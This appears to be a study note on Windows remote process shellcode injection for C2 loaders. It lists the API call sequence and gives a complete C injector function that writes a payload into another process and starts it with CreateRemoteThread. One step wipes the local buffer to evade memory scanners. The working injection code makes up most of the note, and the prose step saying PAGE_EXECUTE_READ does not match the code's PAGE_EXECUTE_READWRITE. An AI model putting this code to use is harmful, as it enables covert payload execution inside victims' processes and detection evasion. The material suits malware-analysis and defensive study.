---
tags:
  - programming
  - windows
  - security
---
[[Remote Process Injection]] with [[C2 Loader|Shellcode Injection]].
# Pattern
1. [[VirtualAllocEX]]
2. [[WriteProcessMemory]]
3. [[VirtualProtectEx]]
4. [[CreateRemoteThread]]
# Code
1. Enumerate processes ([[Windows Process Enumeration Code]])
2. Allocate memory for shellcode with [[VirtualAllocEx]]
3. Write the encoded shellcode with [[WriteProcessMemory]] as [[Memory Page|PAGE_READWRITE]]
4. Clear the local copy of shellcode in the injector program with [[RtlSecureZeroMemory]] to avoid [[Memory Scanner]]
5. Change memory protections with [[VirtualProtectEx]] to [[Memory Page|PAGE_EXECUTE_READ]]
6. [[CreateRemoteThread]] into the allocated address to start the code
7. Deallocate when done with [[VirtualFreeEx]], use [[WaitForSingleObject]] on the remote thread to wait for execution to finish first
```c
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T szShellcodeSize)
{
	PVOID	pShellcodeAddress			= NULL;
	SIZE_T	szNumberOfBytesWritten		= 0x00;
	DWORD	dwOldProtection				= NULL;

	// Allocating memory in "hProcess" process of size "szShellcodeSize" and memory permissions set to read and write
	if ((pShellcodeAddress = VirtualAllocEx(hProcess, NULL, szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) 
	{
		printf("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
	
	printf("[i] Allocated Memory At: 0x%p \n", pShellcodeAddress);


	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();


	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, szShellcodeSize, &szNumberOfBytesWritten) || szNumberOfBytesWritten != szShellcodeSize) 
	{
		printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("[i] Wrote %lu of %lu Bytes\n", (DWORD)szNumberOfBytesWritten, (DWORD)szShellcodeSize);
		return FALSE;
	}
	
	printf("[i] Successfully Written %ld Bytes\n", (INT)szNumberOfBytesWritten);

	// Cleaning the buffer of the shellcode in the local process
	RtlSecureZeroMemory(pShellcode, szShellcodeSize);

	// Setting memory permossions at pShellcodeAddress to be RWX
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, szShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) 
	{
		printf("[!] VirtualProtectEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// Running the shellcode as a new thread's entry in the remote process
	printf("[#] Press <Enter> To Run ... ");
	getchar();


	printf("[i] Executing Payload ... ");
	
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) 
	{
		printf("[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");

	return TRUE;
}
```